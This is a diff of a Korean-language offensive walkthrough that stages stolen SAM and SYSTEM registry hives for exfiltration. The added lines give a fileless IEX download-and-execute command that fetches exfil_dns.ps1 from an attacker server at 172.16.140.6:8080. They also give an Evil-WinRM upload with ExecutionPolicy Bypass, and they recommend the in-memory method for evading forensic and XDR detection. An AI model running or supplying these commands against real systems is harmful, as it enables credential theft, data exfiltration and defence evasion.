@@ -759,15 +759,25 @@ Compress-Archive -Path C:\Temp\sam.hive, C:\Temp\system.hive, `
   -DestinationPath C:\Temp\loot.zip -Force
 ```
 
-**Step 2 — DNS 유출 실행**
+**Step 2 — exfil_dns.ps1 전달 방법 (타겟엔 파일이 없으므로)**
+
+공격자 서버(`172.16.140.6:8080`)가 스크립트를 HTTP로 서빙함.  
+Evil-WinRM 쉘 또는 획득한 PowerShell 세션에서 **메모리에 직접 로드**:
 
 ```powershell
-# exfil_dns.ps1 이 없으면 아래처럼 다운로드 후 실행
+# ── 방법 A: IEX 메모리 실행 (Fileless, 디스크에 흔적 없음) ──
 IEX (New-Object Net.WebClient).DownloadString('http://172.16.140.6:8080/exfil_dns.ps1')
-
-# 또는 파일로 저장 후 실행
-powershell -ExecutionPolicy Bypass -File C:\Temp\exfil_dns.ps1 -TargetFile C:\Temp\loot.zip
 ```
+
+```bash
+# ── 방법 B: Evil-WinRM upload 명령으로 파일 전송 ──
+# Kali 터미널에서
+*Evil-WinRM* PS C:\Temp> upload /root/exfil_dns.ps1 C:\Temp\exfil_dns.ps1
+*Evil-WinRM* PS C:\Temp> powershell -ExecutionPolicy Bypass -File C:\Temp\exfil_dns.ps1
+```
+
+> **방법 A 권장**: 디스크에 파일이 저장되지 않아 포렌식·XDR 탐지 회피에 유리  
+> 단, HTTP 통신이 가능한 환경이어야 함 (DNS만 열린 환경이면 방법 B 사용)
 
 **실행 시 콘솔 출력:**
 ```
